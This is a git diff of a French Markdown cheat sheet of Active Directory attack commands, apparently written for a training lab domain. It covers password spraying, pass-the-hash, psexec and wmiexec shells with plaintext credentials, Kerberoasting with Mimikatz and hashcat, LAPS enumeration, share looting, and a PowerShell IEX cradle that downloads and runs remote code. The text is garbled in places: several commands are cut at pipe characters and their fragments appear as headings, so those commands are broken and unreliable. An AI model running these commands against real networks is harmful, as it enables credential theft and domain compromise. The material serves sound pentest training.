+### Utilise le cmdlet Import-Module pour importer l'outil `PowerView.ps1` depuis un hôte basé sur Windows.
+
 ```bash
 `Import-Module .\PowerView.ps1`
-```shell
+```
+
 ### Utilisée pour énumérer la politique de mot de passe dans un domaine Windows cible depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainPolicy`
-```shell
+```
+
 ### grep "user:" \
+
 ```bash
 `enum4linux -U 172.16.5.5 \
-```shell
+```
+
 ### Utilise rpcclient pour découvrir les comptes utilisateurs dans un domaine Windows cible depuis un hôte basé sur Linux.
+
 ```bash
 `rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser`
-```shell
-### Utilise CrackMapExec pour découvrir les utilisateurs (--users) dans un domaine Windows cible depuis un hôte basé sur Linux.
+```
+
+### Utilise `CrackMapExec` pour découvrir les utilisateurs (`--users`) dans un domaine Windows cible depuis un hôte basé sur Linux.
+
 ```bash
 `crackmapexec smb 172.16.5.5 --users`
-```shell
+```
+
 ### grep sAMAccountName: \
+
 ```bash
 `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" \
-```shell
-### Utilise l'outil Python windapsearch.py pour découvrir les utilisateurs dans un domaine Windows cible depuis un hôte basé sur Linux.
+```
+
+### Utilise l'outil Python `windapsearch.py` pour découvrir les utilisateurs dans un domaine Windows cible depuis un hôte basé sur Linux.
+
 ```bash
 `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`
-```shell
-### grep Authority; done
+```
+
+### grep Authority; done`
+
 ```bash
 `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \
-```shell
-### Utilise kerbrute et une liste d'utilisateurs (valid_users.txt) pour effectuer une attaque de pulvérisation de mot de passe contre un domaine Windows cible depuis un hôte basé sur Linux.
+```
+
+### Utilise `kerbrute` et une liste d'utilisateurs (`valid_users.txt`) pour effectuer une attaque de pulvérisation de mot de passe contre un domaine Windows cible depuis un hôte basé sur Linux.
+
 ```bash
 `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`
-```shell
-### grep +
+```
+
+### grep +`
+
 ```bash
 `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \
-```shell
-### Utilise CrackMapExec pour valider un ensemble d'identifiants depuis un hôte basé sur Linux.
+```
+
+### Utilise `CrackMapExec` pour valider un ensemble d'identifiants depuis un hôte basé sur Linux.
+
 ```bash
 `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`
-```shell
-### grep +
+```
+
+### grep +`
+
 ```bash
 `sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \
-```shell
-### Utilisé pour importer l'outil basé sur PowerShell DomainPasswordSpray.ps1 depuis un hôte basé sur Windows.
+```
+
+### Utilisé pour importer l'outil basé sur PowerShell `DomainPasswordSpray.ps1` depuis un hôte basé sur Windows.
+
 ```bash
 `Import-Module .\DomainPasswordSpray.ps1`
-```shell
-### Effectue une attaque de pulvérisation de mot de passe et enregistre (-OutFile) les résultats dans un fichier spécifié (spray_success) depuis un hôte basé sur Windows.
+```
+
+### Effectue une attaque de pulvérisation de mot de passe et enregistre (-OutFile) les résultats dans un fichier spécifié (`spray_success`) depuis un hôte basé sur Windows.
+
 ```bash
 `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`
-```shell
+```
+
+
 # Énumération de Contrôles de Sécurité et Active Directory
 
 ## Table des matières
-
 1. [Énumération des Contrôles de Sécurité](#énumération-des-contrôles-de-sécurité)
 2. [Énumération avec Identifiants](#énumération-avec-identifiants)
 3. [Énumération par "Living Off the Land"](#énumération-par-living-off-the-land)
 
 ## Énumération des Contrôles de Sécurité
 
-### Cmdlet PowerShell utilisé pour vérifier le statut de Windows Defender Anti-Virus depuis un hôte basé sur Windows.
+### Cmdlet PowerShell utilisé pour vérifier le statut de `Windows Defender Anti-Virus` depuis un hôte basé sur Windows.
+
 ```bash
 `Get-MpComputerStatus`
-```shell
-### select -ExpandProperty RuleCollections
+```
+
+### select -ExpandProperty RuleCollections`
+
 ```bash
 `Get-AppLockerPolicy -Effective \
-```shell
-### Script PowerShell utilisé pour découvrir le Mode de Langage PowerShell utilisé sur un hôte basé sur Windows. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Script PowerShell utilisé pour découvrir le `Mode de Langage PowerShell` utilisé sur un hôte basé sur Windows. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `$ExecutionContext.SessionState.LanguageMode`
-```shell
-### Une fonction LAPSToolkit qui découvre les Groupes Délégués LAPS depuis un hôte basé sur Windows.
+```
+
+### Une fonction `LAPSToolkit` qui découvre les `Groupes Délégués LAPS` depuis un hôte basé sur Windows.
+
 ```bash
 `Find-LAPSDelegatedGroups`
-```shell
-### Une fonction LAPSTookit qui vérifie les droits sur chaque ordinateur avec LAPS activé pour tous les groupes ayant un accès en lecture et les utilisateurs avec Tous les Droits Étendus. Exécutée depuis un hôte basé sur Windows.
+```
+
+### Une fonction `LAPSTookit` qui vérifie les droits sur chaque ordinateur avec LAPS activé pour tous les groupes ayant un accès en lecture et les utilisateurs avec `Tous les Droits Étendus`. Exécutée depuis un hôte basé sur Windows.
+
 ```bash
 `Find-AdmPwdExtendedRights`
-```shell
-### Une fonction LAPSToolkit qui recherche les ordinateurs qui ont LAPS activé, découvre l'expiration des mots de passe et peut découvrir les mots de passe aléatoires. Exécutée depuis un hôte basé sur Windows.
+```
+
+### Une fonction `LAPSToolkit` qui recherche les ordinateurs qui ont LAPS activé, découvre l'expiration des mots de passe et peut découvrir les mots de passe aléatoires. Exécutée depuis un hôte basé sur Windows.
+
 ```bash
 `Get-LAPSComputers`
-```shell
+```
+
 ## Énumération avec Identifiants
 
 ### Se connecte à une cible Windows en utilisant des identifiants valides. Exécutée depuis un hôte basé sur Linux.
+
 ```bash
 `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25`
-```shell
-### S'authentifie auprès d'une cible Windows via smb en utilisant des identifiants valides et tente de découvrir plus d'utilisateurs (--users) dans un domaine Windows cible. Exécutée depuis un hôte basé sur Linux.
+```
+
+### S'authentifie auprès d'une cible Windows via `smb` en utilisant des identifiants valides et tente de découvrir plus d'utilisateurs (`--users`) dans un domaine Windows cible. Exécutée depuis un hôte basé sur Linux.
+
 ```bash
 `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users`
-```shell
-### S'authentifie auprès d'une cible Windows via smb en utilisant des identifiants valides et tente de découvrir des groupes (--groups) dans un domaine Windows cible. Exécutée depuis un hôte basé sur Linux.
+```
+
+### S'authentifie auprès d'une cible Windows via `smb` en utilisant des identifiants valides et tente de découvrir des groupes (`--groups`) dans un domaine Windows cible. Exécutée depuis un hôte basé sur Linux.
+
 ```bash
 `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups`
-```shell
-### S'authentifie auprès d'une cible Windows via smb en utilisant des identifiants valides et tente de vérifier une liste d'utilisateurs connectés (--loggedon-users) sur l'hôte Windows cible. Exécutée depuis un hôte basé sur Linux.
+```
+
+### S'authentifie auprès d'une cible Windows via `smb` en utilisant des identifiants valides et tente de vérifier une liste d'utilisateurs connectés (`--loggedon-users`) sur l'hôte Windows cible. Exécutée depuis un hôte basé sur Linux.
+
 ```bash
 `sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users`
-```shell
-### S'authentifie auprès d'une cible Windows via smb en utilisant des identifiants valides et tente de découvrir tous les partages smb (--shares). Exécutée depuis un hôte basé sur Linux.
+```
+
+### S'authentifie auprès d'une cible Windows via `smb` en utilisant des identifiants valides et tente de découvrir tous les partages smb (`--shares`). Exécutée depuis un hôte basé sur Linux.
+
 ```bash
 `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares`
-```shell
-### S'authentifie auprès d'une cible Windows via smb en utilisant des identifiants valides et utilise le module CrackMapExec (-M) spider_plus pour parcourir chaque partage lisible (Dev-share) et lister tous les fichiers lisibles. Les résultats sont affichés en JSON. Exécutée depuis un hôte basé sur Linux.
+```
+
+### S'authentifie auprès d'une cible Windows via `smb` en utilisant des identifiants valides et utilise le module CrackMapExec (`-M`) `spider_plus` pour parcourir chaque partage lisible (`Dev-share`) et lister tous les fichiers lisibles. Les résultats sont affichés en `JSON`. Exécutée depuis un hôte basé sur Linux.
+
 ```bash
 `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share`
-```shell
-### Énumère le domaine Windows cible en utilisant des identifiants valides et liste les partages et les permissions disponibles sur chacun dans le contexte des identifiants valides utilisés et de l'hôte Windows cible (-H). Exécutée depuis un hôte basé sur Linux.
+```
+
+### Énumère le domaine Windows cible en utilisant des identifiants valides et liste les partages et les permissions disponibles sur chacun dans le contexte des identifiants valides utilisés et de l'hôte Windows cible (`-H`). Exécutée depuis un hôte basé sur Linux.
+
 ```bash
 `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5`
-```shell
-### Énumère le domaine Windows cible en utilisant des identifiants valides et effectue une liste récursive (-R) du partage spécifié (SYSVOL) et n'affiche qu'une liste de répertoires (--dir-only) dans le partage. Exécutée depuis un hôte basé sur Linux.
+```
+
+### Énumère le domaine Windows cible en utilisant des identifiants valides et effectue une liste récursive (`-R`) du partage spécifié (`SYSVOL`) et n'affiche qu'une liste de répertoires (`--dir-only`) dans le partage. Exécutée depuis un hôte basé sur Linux.
+
 ```bash
 `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only`
-```shell
-### Énumère un compte utilisateur cible dans un domaine Windows en utilisant son identifiant relatif (0x457). Exécutée depuis un hôte basé sur Linux.
+```
+
+### Énumère un compte utilisateur cible dans un domaine Windows en utilisant son identifiant relatif (`0x457`). Exécutée depuis un hôte basé sur Linux.
+
 ```bash
 `rpcclient $> queryuser 0x457`
-```shell
-### Découvre les comptes utilisateurs dans un domaine Windows cible et leurs identifiants relatifs associés (rid). Exécutée depuis un hôte basé sur Linux.
+```
+
+### Découvre les comptes utilisateurs dans un domaine Windows cible et leurs identifiants relatifs associés (`rid`). Exécutée depuis un hôte basé sur Linux.
+
 ```bash
 `rpcclient $> enumdomusers`
-```shell
-### Outil Impacket utilisé pour se connecter à la CLI d'une cible Windows via le partage administratif ADMIN$ avec des identifiants valides. Exécuté depuis un hôte basé sur Linux.
+```
+
+### Outil Impacket utilisé pour se connecter à la `CLI` d'une cible Windows via le partage administratif `ADMIN$` avec des identifiants valides. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125`
-```shell
-### Outil Impacket utilisé pour se connecter à la CLI d'une cible Windows via WMI avec des identifiants valides. Exécuté depuis un hôte basé sur Linux.
+```
+
+### Outil Impacket utilisé pour se connecter à la `CLI` d'une cible Windows via `WMI` avec des identifiants valides. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5`
-```shell
+```
+
 ### Utilisé pour afficher les options et la fonctionnalité de windapsearch.py. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `windapsearch.py -h`
-```shell
-### Utilisé pour énumérer le groupe des administrateurs de domaine (--da) en utilisant un ensemble d'identifiants valides sur un domaine Windows cible. Exécuté depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour énumérer le groupe des administrateurs de domaine (`--da`) en utilisant un ensemble d'identifiants valides sur un domaine Windows cible. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da`
-```shell
-### Utilisé pour effectuer une recherche récursive (-PU) d'utilisateurs avec des permissions imbriquées en utilisant des identifiants valides. Exécuté depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour effectuer une recherche récursive (`-PU`) d'utilisateurs avec des permissions imbriquées en utilisant des identifiants valides. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU`
-```shell
-### Exécute l'implémentation python de BloodHound (bloodhound.py) avec des identifiants valides et spécifie un serveur de noms (-ns) et un domaine Windows cible (inlanefreight.local) ainsi qu'exécute toutes les vérifications (-c all). Fonctionne avec des identifiants valides. Exécuté depuis un hôte basé sur Linux.
+```
+
+### Exécute l'implémentation python de BloodHound (`bloodhound.py`) avec des identifiants valides et spécifie un serveur de noms (`-ns`) et un domaine Windows cible (`inlanefreight.local`) ainsi qu'exécute toutes les vérifications (`-c all`). Fonctionne avec des identifiants valides. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all`
-```shell
+```
+
 ## Énumération par "Living Off the Land"
 
 ### Cmdlet PowerShell utilisé pour lister tous les modules disponibles, leur version et options de commande depuis un hôte basé sur Windows.
+
 ```bash
 `Get-Module`
-```shell
-### Charge le module PowerShell Active Directory depuis un hôte basé sur Windows.
+```
+
+### Charge le module PowerShell `Active Directory` depuis un hôte basé sur Windows.
+
 ```bash
 `Import-Module ActiveDirectory`
-```shell
+```
+
 ### Cmdlet PowerShell utilisé pour recueillir des informations sur le domaine Windows depuis un hôte basé sur Windows.
+
 ```bash
 `Get-ADDomain`
-```shell
-### Cmdlet PowerShell utilisé pour énumérer les comptes utilisateurs sur un domaine Windows cible et filtrer par ServicePrincipalName. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Cmdlet PowerShell utilisé pour énumérer les comptes utilisateurs sur un domaine Windows cible et filtrer par `ServicePrincipalName`. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
-```shell
-### Cmdlet PowerShell utilisé pour énumérer toutes les relations de confiance dans un domaine Windows cible et filtre par tous (-Filter *). Exécuté depuis un hôte basé sur Windows.
+```
+
+### Cmdlet PowerShell utilisé pour énumérer toutes les relations de confiance dans un domaine Windows cible et filtre par tous (`-Filter *`). Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-ADTrust -Filter *`
-```shell
-### select name
+```
+
+### select name`
+
 ```bash
 `Get-ADGroup -Filter * \
-```shell
-### Cmdlet PowerShell utilisé pour rechercher un groupe spécifique (-Identity "Backup Operators"). Exécuté depuis un hôte basé sur Windows.
+```
+
+### Cmdlet PowerShell utilisé pour rechercher un groupe spécifique (`-Identity "Backup Operators"`). Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-ADGroup -Identity "Backup Operators"`
-```shell
-### Cmdlet PowerShell utilisé pour découvrir les membres d'un groupe spécifique (-Identity "Backup Operators"). Exécuté depuis un hôte basé sur Windows.
+```
+
+### Cmdlet PowerShell utilisé pour découvrir les membres d'un groupe spécifique (`-Identity "Backup Operators"`). Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-ADGroupMember -Identity "Backup Operators"`
-```shell
-### Script PowerView utilisé pour ajouter des résultats à un fichier CSV. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Script PowerView utilisé pour ajouter des résultats à un fichier `CSV`. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Export-PowerViewCSV`
-```shell
-### Script PowerView utilisé pour convertir un nom d'Utilisateur ou de Groupe en son SID. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Script PowerView utilisé pour convertir un nom d'`Utilisateur` ou de `Groupe` en son `SID`. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `ConvertTo-SID`
-```shell
-### Script PowerView utilisé pour demander le ticket kerberos pour un nom principal de service spécifié (SPN). Exécuté depuis un hôte basé sur Windows.
+```
+
+### Script PowerView utilisé pour demander le ticket kerberos pour un nom principal de service spécifié (`SPN`). Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainSPNTicket`
-```shell
+```
+
 ### Script PowerView utilisé pour retourner l'objet AD pour le domaine actuel (ou spécifié). Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-Domain`
-```shell
+```
+
 ### Script PowerView utilisé pour retourner une liste des contrôleurs de domaine cibles pour le domaine cible spécifié. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainController`
-```shell
+```
+
 ### Script PowerView utilisé pour retourner tous les utilisateurs ou des objets utilisateurs spécifiques dans AD. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainUser`
-```shell
+```
+
 ### Script PowerView utilisé pour retourner tous les ordinateurs ou des objets ordinateurs spécifiques dans AD. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainComputer`
-```shell
+```
+
 ### Script PowerView utilisé pour retourner tous les groupes ou des objets groupes spécifiques dans AD. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainGroup`
-```shell
+```
+
 ### Script PowerView utilisé pour rechercher tous les objets OU ou des objets OU spécifiques dans AD. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainOU`
-```shell
-### Script PowerView utilisé pour trouver des ACL d'objets dans le domaine avec des droits de modification définis pour des objets non intégrés. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Script PowerView utilisé pour trouver des `ACL` d'objets dans le domaine avec des droits de modification définis pour des objets non intégrés. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Find-InterestingDomainAcl`
-```shell
+```
+
 ### Script PowerView utilisé pour retourner les membres d'un groupe de domaine spécifique. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainGroupMember`
-```shell
+```
+
 ### Script PowerView utilisé pour retourner une liste de serveurs fonctionnant probablement comme des serveurs de fichiers. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainFileServer`
-```shell
+```
+
 ### Script PowerView utilisé pour retourner une liste de tous les systèmes de fichiers distribués pour le domaine actuel (ou spécifié). Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainDFSShare`
-```shell
+```
+
 ### Script PowerView utilisé pour retourner tous les GPO ou des objets GPO spécifiques dans AD. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainGPO`
-```shell
+```
+
 ### Script PowerView utilisé pour retourner la politique de domaine par défaut ou la politique de contrôleur de domaine pour le domaine actuel. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainPolicy`
-```shell
+```
+
 ### Script PowerView utilisé pour énumérer les groupes locaux sur une machine locale ou distante. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-NetLocalGroup`
-```shell
+```
+
 ### Script PowerView utilisé pour énumérer les membres d'un groupe local spécifique. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-NetLocalGroupMember`
-```shell
+```
+
 ### Script PowerView utilisé pour retourner une liste de partages ouverts sur une machine locale (ou distante). Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-NetShare`
-```shell
+```
+
 ### Script PowerView utilisé pour retourner les informations de session pour la machine locale (ou distante). Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-NetSession`
-```shell
+```
+
 ### Script PowerView utilisé pour tester si l'utilisateur actuel a un accès administratif à la machine locale (ou distante). Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Test-AdminAccess`
-```shell
+```
+
 ### Script PowerView utilisé pour trouver les machines où des utilisateurs spécifiques sont connectés. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Find-DomainUserLocation`
-```shell
+```
+
 ### Script PowerView utilisé pour trouver des partages accessibles sur les machines du domaine. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Find-DomainShare`
-```shell
+```
+
 ### Script PowerView qui recherche des fichiers correspondant à des critères spécifiques sur des partages lisibles dans le domaine. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Find-InterestingDomainShareFile`
-```shell
+```
+
 ### Script PowerView utilisé pour trouver des machines sur le domaine local où l'utilisateur actuel a un accès administrateur local. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Find-LocalAdminAccess`
-```shell
+```
+
 ### Script PowerView qui retourne les relations de confiance du domaine pour le domaine actuel ou un domaine spécifié. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainTrust`
-```shell
+```
+
 ### Script PowerView qui retourne toutes les relations de confiance de forêt pour la forêt actuelle ou une forêt spécifiée. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-ForestTrust`
-```shell
+```
+
 ### Script PowerView qui énumère les utilisateurs qui sont dans des groupes en dehors du domaine de l'utilisateur. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainForeignUser`
-```shell
+```
+
 ### Script PowerView qui énumère les groupes avec des utilisateurs en dehors du domaine du groupe et retourne chaque membre étranger. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainForeignGroupMember`
-```shell
+```
+
 ### Script PowerView qui énumère toutes les relations de confiance pour le domaine actuel et tout autre domaine visible. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainTrustMapping`
-```shell
-### Script PowerView utilisé pour lister tous les membres d'un groupe cible ("Domain Admins") grâce à l'utilisation de l'option récursive (-Recurse). Exécuté depuis un hôte basé sur Windows.
+```
+
+### Script PowerView utilisé pour lister tous les membres d'un groupe cible (`"Domain Admins"`) grâce à l'utilisation de l'option récursive (`-Recurse`). Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainGroupMember -Identity "Domain Admins" -Recurse`
-```shell
-### Script PowerView utilisé pour trouver des utilisateurs sur le domaine Windows cible qui ont le Service Principal Name défini. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Script PowerView utilisé pour trouver des utilisateurs sur le domaine Windows cible qui ont le `Service Principal Name` défini. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`
-```shell
-### Exécute un outil appelé Snaffler contre un domaine Windows cible qui trouve différents types de données dans les partages auxquels le compte compromis a accès. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Exécute un outil appelé `Snaffler` contre un domaine Windows cible qui trouve différents types de données dans les partages auxquels le compte compromis a accès. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data`
-```shell
+```
+
+
 # Transfert de Fichiers, Kerberoasting et Énumération ACL
 
 ## Table des matières
-
 1. [Transfert de Fichiers](#transfert-de-fichiers)
 2. [Kerberoasting](#kerberoasting)
 3. [Énumération et Tactiques ACL](#énumération-et-tactiques-acl)
@@ -2503,205 +3524,302 @@ SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_C
 ## Transfert de Fichiers
 
 ### Démarre un serveur web Python pour l'hébergement rapide de fichiers. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `sudo python3 -m http.server 8001`
-```shell
+```
+
 ### One-liner PowerShell utilisé pour télécharger un fichier depuis un serveur web. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"`
-```shell
-### Démarre un serveur SMB impacket pour l'hébergement rapide d'un fichier. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Démarre un serveur `SMB` impacket pour l'hébergement rapide d'un fichier. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/`
-```shell
+```
+
 ## Kerberoasting
 
 ### Utilisé pour installer Impacket à partir du répertoire qui a été cloné sur l'hôte d'attaque. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `sudo python3 -m pip install .`
-```shell
-### Outil Impacket utilisé pour afficher les options et la fonctionnalité de GetUserSPNs.py depuis un hôte basé sur Linux.
+```
+
+### Outil Impacket utilisé pour afficher les options et la fonctionnalité de `GetUserSPNs.py` depuis un hôte basé sur Linux.
+
 ```bash
 `GetUserSPNs.py -h`
-```shell
-### Outil Impacket utilisé pour obtenir une liste de SPN sur le domaine Windows cible depuis un hôte basé sur Linux.
+```
+
+### Outil Impacket utilisé pour obtenir une liste de `SPN` sur le domaine Windows cible depuis un hôte basé sur Linux.
+
 ```bash
 `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday`
-```shell
-### Outil Impacket utilisé pour télécharger/demander (-request) tous les tickets TGS pour un traitement hors ligne depuis un hôte basé sur Linux.
+```
+
+### Outil Impacket utilisé pour télécharger/demander (`-request`) tous les tickets TGS pour un traitement hors ligne depuis un hôte basé sur Linux.
+
 ```bash
 `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request`
-```shell
-### Outil Impacket utilisé pour télécharger/demander (-request-user) un ticket TGS pour un compte utilisateur spécifique (sqldev) depuis un hôte basé sur Linux.
+```
+
+### Outil Impacket utilisé pour télécharger/demander (`-request-user`) un ticket TGS pour un compte utilisateur spécifique (`sqldev`) depuis un hôte basé sur Linux.
+
 ```bash
 `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev`
-```shell
-### Outil Impacket utilisé pour télécharger/demander un ticket TGS pour un compte utilisateur spécifique et écrire le ticket dans un fichier (-outputfile sqldev_tgs) depuis un hôte basé sur Linux.
+```
+
+### Outil Impacket utilisé pour télécharger/demander un ticket TGS pour un compte utilisateur spécifique et écrire le ticket dans un fichier (`-outputfile sqldev_tgs`) depuis un hôte basé sur Linux.
+
 ```bash
 `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs`
-```shell
-### Tente de cracker le hash du ticket Kerberos (-m 13100) (sqldev_tgs) en utilisant hashcat et une liste de mots (rockyou.txt) depuis un hôte basé sur Linux.
+```
+
+### Tente de cracker le hash du ticket Kerberos (`-m 13100`) (`sqldev_tgs`) en utilisant `hashcat` et une liste de mots (`rockyou.txt`) depuis un hôte basé sur Linux.
+
 ```bash
 `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force`
-```shell
-### Utilisé pour énumérer les SPN dans un domaine Windows cible depuis un hôte basé sur Windows.
+```
+
+### Utilisé pour énumérer les `SPN` dans un domaine Windows cible depuis un hôte basé sur Windows.
+
 ```bash
 `setspn.exe -Q */*`
-```shell
+```
+
 ### Script PowerShell utilisé pour télécharger/demander le ticket TGS d'un utilisateur spécifique depuis un hôte basé sur Windows.
+
 ```bash
 `Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`
-```shell
+```
+
 ### Select-String '^CN' -Context 0,1 \
+
 ```bash
 `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \
-```shell
-### Commande Mimikatz qui garantit que les tickets TGS sont extraits au format base64 depuis un hôte basé sur Windows.
+```
+
+### Commande `Mimikatz` qui garantit que les tickets TGS sont extraits au format `base64` depuis un hôte basé sur Windows.
+
 ```bash
 `mimikatz # base64 /out:true`
-```shell
-### Commande Mimikatz utilisée pour extraire les tickets TGS depuis un hôte basé sur Windows.
+```
+
+### Commande `Mimikatz` utilisée pour extraire les tickets TGS depuis un hôte basé sur Windows.
+
 ```bash
 `kerberos::list /export`
-```shell
-### tr -d \\n
+```
+
+### tr -d \\n`
+
 ```bash
 `echo "<base64 blob>" \
-```shell
-### base64 -d > sqldev.kirbi
+```
+
+### base64 -d > sqldev.kirbi`
+
 ```bash
 `cat encoded_file \
-```shell
-### Utilisé pour extraire le ticket Kerberos. Cela crée également un fichier appelé crack_file depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour extraire le `ticket Kerberos`. Cela crée également un fichier appelé `crack_file` depuis un hôte basé sur Linux.
+
 ```bash
 `python2.7 kirbi2john.py sqldev.kirbi`
-```shell
-### Utilisé pour modifier le crack_file pour Hashcat depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour modifier le `crack_file` pour `Hashcat` depuis un hôte basé sur Linux.
+
 ```bash
 `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`
-```shell
+```
+
 ### Utilisé pour visualiser le hash préparé depuis un hôte basé sur Linux.
+
 ```bash
 `cat sqldev_tgs_hashcat`
-```shell
-### Utilisé pour cracker le hash du ticket Kerberos préparé (sqldev_tgs_hashcat) en utilisant une liste de mots (rockyou.txt) depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour cracker le hash du ticket Kerberos préparé (`sqldev_tgs_hashcat`) en utilisant une liste de mots (`rockyou.txt`) depuis un hôte basé sur Linux.
+
 ```bash
 `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`
-```shell
-### select samaccountname
+```
+
+### select samaccountname`
+
 ```bash
 `Import-Module .\PowerView.ps1 Get-DomainUser * -spn \
-```shell
-### Get-DomainSPNTicket -Format Hashcat
+```
+
+### Get-DomainSPNTicket -Format Hashcat`
+
 ```bash
 `Get-DomainUser -Identity sqldev \
-```shell
+```
+
 ### Get-DomainSPNTicket -Format Hashcat \
+
 ```bash
 `Get-DomainUser * -SPN \
-```shell
+```
+
 ### Utilisé pour visualiser le contenu du fichier .csv depuis un hôte basé sur Windows.
+
 ```bash
 `cat .\ilfreight_tgs.csv`
-```shell
